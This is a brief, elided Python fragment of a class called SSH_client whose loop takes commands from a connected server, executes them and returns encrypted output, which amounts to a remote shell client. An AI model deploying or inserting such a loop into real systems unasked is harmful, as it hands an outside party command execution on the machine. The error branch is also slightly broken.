...
class SSH_client:
    ...
    def main(self):
        ...
        while True:
            r = self.receive_from(server)
            try:
                a = cmd(r)
            except Exception as e:
                wrong = f'[!] Error:{e}'
                server.send(ssh_cryptor.encrypt(wrong.encode(encoding='gb2312', errors='ignore'), type='serverkey'))
            if r == 'exit':
                server.close()
                sys.exit(0)
            server.send(ssh_cryptor.encrypt(a.encode(encoding='gb2312', errors='ignore') or b'okay', type='serverkey'))
